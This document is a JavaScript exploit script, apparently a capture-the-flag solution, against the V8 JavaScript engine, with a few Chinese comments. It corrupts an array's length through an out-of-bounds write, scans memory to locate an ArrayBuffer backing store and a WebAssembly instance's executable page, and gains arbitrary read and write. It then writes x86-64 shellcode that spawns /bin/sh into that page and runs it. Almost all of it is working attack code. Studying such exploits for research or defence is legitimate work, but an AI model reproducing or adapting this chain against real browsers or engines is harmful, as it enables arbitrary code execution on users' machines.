function hexx(str, value){
    print("\033[32m[+]"+str+": \033[0m0x"+value.toString(16))
}

var raw_buf = new ArrayBuffer(8);
var d_buf = new Float64Array(raw_buf);
var l_buf = new BigInt64Array(raw_buf);

function d2l(x){
    d_buf[0] = x;
    return l_buf[0];
}
function l2d(x){
    l_buf[0] = x;
    return d_buf[0];
}

var arr = [1.1];
arr.push(1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2, 1.2);
var oob = [1];
oob[1] = 1.1;
// console.log("arr");
// %DebugPrint(arr);
// console.log("oob");
// %DebugPrint(oob);


var ele_and_len = d2l(arr[36]);
hexx("ele_and_len", ele_and_len);
arr[36] = l2d((ele_and_len&0xffffffffn)|0x100000000000n);


//代码扫描 oob 数组，寻找 0x2024n，这是 victim 这个 ArrayBuffer 的大小，说明找到了它的元数据结构。
//backing_store 指针通常紧接着 size 之后，因此 backing_store_index = i + 1。
var victim = new ArrayBuffer(0x2024);
var arb_buf = new DataView(victim);

var backing_store_index = -1;
for(let i = 0; i < 2048; i++){
    if(d2l(oob[i]) === 0x2024n){
        backing_store_index = i + 1;
        break;
    }
}
if(backing_store_index === -1){
    throw "FAILED to hit ArrayBuffer";
}

hexx('backing_store_index', backing_store_index);

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,
                                128,0,1,96,0,1,127,3,130,128,128,128,
                                0,1,0,4,132,128,128,128,0,1,112,0,0,5,
                                131,128,128,128,0,1,0,1,6,129,128,128,128,
                                0,0,7,145,128,128,128,0,2,6,109,101,109,111,
                                114,121,2,0,4,109,97,105,110,0,0,10,142,128,128,
                                128,0,1,136,128,128,128,0,0,65,239,253,182,245,125,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;

//让 tmp 变成 FixedDoubleArray，其中存储的是 double 类型的值。
var wasm_instance_index = -1;
var tmp = [wasm_instance, 0x290098a];

for (let i = 0; i < 2048; i++) {
        let v = d2l(oob[i]);
        if (((v & 0xffffffff00000000n) === 0x520131400000000n) && ((v & 0xffffffffn) != 0)){
        //      hexx("d2l(oob[i])", d2l(oob[i]));
                wasm_instance_index = i;
                break;
        }
}

if(wasm_instance_index === -1) {
    throw "FAILED to WasmInstance";
}

hexx('wasm_instance_index', wasm_instance_index);
// console.log("oob");
// %DebugPrint(oob);
// %SystemBreak();
var wasm_instance_addr = d2l(oob[wasm_instance_index])&0xffffffffn;
hexx('wasm_instance_addr', wasm_instance_addr);

arr[36] = l2d((wasm_instance_addr)|0x100000000000n);
// console.log("oob");
// %DebugPrint(oob);
// %SystemBreak();
var rwx_addr = d2l(oob[12]);
hexx('rwx_addr', rwx_addr);

arr[36] = l2d((ele_and_len&0xffffffffn)|0x100000000000n);
oob[backing_store_index] = l2d(rwx_addr);

var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
];

for(let i = 0; i< shellcode.length; i++){
    arb_buf.setBigInt64(i*8, shellcode[i], true);
}

pwn();
